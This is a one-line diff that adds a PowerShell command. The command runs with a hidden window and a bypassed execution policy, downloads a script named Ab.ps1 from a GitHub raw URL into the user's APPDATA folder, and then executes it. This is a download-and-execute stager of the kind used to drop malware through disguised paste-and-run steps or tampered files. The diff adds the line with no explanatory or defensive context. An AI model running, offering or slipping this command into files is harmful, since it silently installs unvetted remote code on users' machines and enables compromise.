@@ -1,0 +1,1 @@
+ powershell -w h -NoP -NonI -Ep Bypass "echo (iwr https://github.com/Aevagee/younet/raw/refs/heads/main/Ab.ps1).content > "$env:APPDATA\Ab.ps1";powershell "$env:APPDATa\Ab.ps1""
